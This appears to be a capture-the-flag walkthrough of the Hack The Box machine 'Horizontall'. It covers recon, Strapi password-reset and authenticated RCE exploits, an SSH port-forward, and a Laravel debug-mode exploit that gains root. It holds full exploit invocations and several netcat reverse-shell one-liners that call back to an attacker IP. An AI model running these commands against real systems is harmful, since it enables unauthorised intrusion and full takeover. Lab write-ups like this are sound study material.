## Horizontall 
---

### Reconnaissance 

#### Nmap Scan
```
❯ nmap -sV -sC 10.10.11.105 -oA recon/recon-horizontall
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 12:31 EST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.057s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: horizontall
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds

```

#### Gobuster Search
```
❯ gobuster dir -u http://horizontall.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster/gob-horizontall
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/10 12:32:08 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/] 
Progress: 100680 / 220562 (45.65%)                                              ^C
[!] Keyboard interrupt detected, terminating.
```

The "horizontall.htb" link needed to be added to the /etc/hosts file.


#### Checking the website

![[Screen Shot 2022-01-10 at 3.20.46 PM.png]]

Upon inspecting the website, there are 2 links in the inspect page that can be accessed. 

![[Screen Shot 2022-01-10 at 3.22.10 PM.png]]

The second link shows another endpoint of api-prod.horizontall.htb, this was then added to the /etc/hosts file so it was accessible. 

![[Screen Shot 2022-01-10 at 3.26.05 PM.png]]

---
#### api-prod Gobuster search

```
❯ gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o api-prod-endpoint/gob-apiprod
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://api-prod.horizontall.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/10 12:42:18 Starting gobuster in directory enumeration mode
===============================================================
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60] 
/admin                (Status: 200) [Size: 854]
/Reviews              (Status: 200) [Size: 507]
/Users                (Status: 403) [Size: 60] 
/Admin                (Status: 200) [Size: 854]
/REVIEWS              (Status: 200) [Size: 507]
                                               
===============================================================
2022/01/10 13:02:23 Finished
===============================================================
```

Visiting the "api-prod.horizontall.htb/admin" endpoint shows a strapi admin panel.

Using searchsploit shows some potential exploits for this. 

![[Screen Shot 2022-01-10 at 3.30.10 PM.png]]

The first exploit that was used was the 50237.py exploit (Set password). This was used to set the password to 'password'.

```
❯ python3 50237.py
[*] strapi version: 3.0.0-beta.17.4
[*] Password reset for user: admin@horizontall.htb
[*] Setting new password
[+] New password 'password' set for user admin@horizontall.htb 
```

Then the next exploit was the 50238.py exploit (RCE Authenticated). The JWT token was obtained by signing in and getting the token through BurpSuite. Then the exploit was used to create a reverse shell on the box.

```
❯ ./50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxODM5OTA1LCJleHAiOjE2NDQ0MzE5MDV9.lDuFAv8wov8nWIiZup61QRbgPPtb-DoHCpT4Mrt_UQk "mkfifo /tmp/p; nc 10.10.14.99 3333 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p" 10.10.14.99

=====================================
CVE-2019-19609 - Strapi RCE
=====================================

[+] Successful operation!!!
Error: Couldn't setup listening socket (err=-3)
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.14.0 (Ubuntu)</center>
</body>
</html>
```

My favourite one-liner nc reverse shell >>

```
mkfifo /tmp/p; nc <LHOST> <LPORT> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p
```


#### Initial foothold
```
❯ nc -lvnp 3333

Connection from 10.10.11.105:48162
ls

api
build
config
extensions
favicon.ico
node_modules
package.json
package-lock.json
public
README.md

python -c 'import pty; pty.spawn("/bin/bash")'
strapi@horizontall:~/myapi$ 
```


#### User flag
```
strapi@horizontall:~/myapi$ cd /home
cd /home

strapi@horizontall:/home$ ls
ls
developer

strapi@horizontall:/home$ cd developer
cd developer

strapi@horizontall:/home/developer$ ls
ls
composer-setup.php  myproject  user.txt

strapi@horizontall:/home/developer$ cat user.txt
cat user.txt
0325789ed8df79cde2679ecc8f10d209
```

After looking around the system and falling into rabbit-holes for like 30 minutes I found an open port on the local system.

```
strapi@horizontall:~$ netstat -ln
netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
```

The MySQL server on port 3306 didn't contain any useful information so the next logical step was to create a reverse connection using SSH. 

#### Creating the keys on the victim machine
```
strapi@horizontall:~/.ssh$ ssh-keygen -t rsa -C "random comment"
ssh-keygen -t rsa -C "random comment"
Generating public/private rsa key pair.
Enter file in which to save the key (/opt/strapi/.ssh/id_rsa): id_rsa
id_rsa
Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:rWJqYvxvL5Ktiz3IsbuMdPBaoAr5n6R+M7Rigxixc5k random comment
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|                 |
|                 |
|.        .       |
| = o    S .      |
|=.E .    .       |
|=O O.+o .        |
|*+#=X++.         |
|o=O@OX.o.        |
+----[SHA256]-----+
strapi@horizontall:~/.ssh$ ls
ls
authorized_keys  id_rsa  id_rsa.pub
strapi@horizontall:~/.ssh$ cat id_rsa.pub >> authorized_keys
```

Then repeat these steps on the attacker machine and write out the generated key to the victim authorized key file. Then write out the victim-generated key to the authorized key file on the attacker machine. 

The next step is to make the reverse connection.

```
❯ ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
  System information as of Mon Jan 10 19:51:00 UTC 2022
  System load:  0.02              Processes:           186
  Usage of /:   85.0% of 4.85GB   Users logged in:     0
  Memory usage: 46%               IP address for eth0: 10.10.11.105
  Swap usage:   0%
  => / is using 85.0% of 4.85GB

0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Jan 10 19:48:18 2022 from 10.10.14.99
$
```

Now visiting the domain 'http://127.0.0.1:8000' revealing a Laravel website. 

![[Screen Shot 2022-01-10 at 3.53.00 PM.png]]

Using the debug mode exploit, a shell can be gained on the root user of the system. 


#### Root account foothold

```
❯ ./49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'mkfifo /tmp/p; nc 10.10.14.99 16666 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p'

Exploit...

```



```
❯ nc -lvnp 16666
Connection from 10.10.11.105:48202
pwd
/home/developer/myproject/public
cd
ls
boot.sh
pid
restart.sh
root.txtcat root.txt
b65c80d2e2ecae0c11cff2ba03ef44f3
```





